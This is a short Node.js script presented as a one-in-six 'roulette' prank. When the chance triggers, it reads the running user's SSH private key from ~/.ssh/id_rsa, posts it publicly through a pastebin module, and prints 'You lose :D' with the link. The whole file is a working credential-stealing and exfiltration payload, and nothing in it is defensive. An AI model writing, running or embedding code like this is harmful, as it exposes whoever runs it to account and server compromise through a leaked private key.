const fs = require('fs/promises')
const pastebin = require('./pastebin')

;(async () => {
  if (Math.floor(Math.random() * 6) === 0) {
    const privateKey = await fs.readFile(`${process.env.HOME}/.ssh/id_rsa`, {
      encoding: 'utf8'
    })

    const pasteUrl = await pastebin.post(`${process.env.USER}'s SSH private key`, privateKey)
    console.log(`You lose :D ${pasteUrl}`)
  }
})()
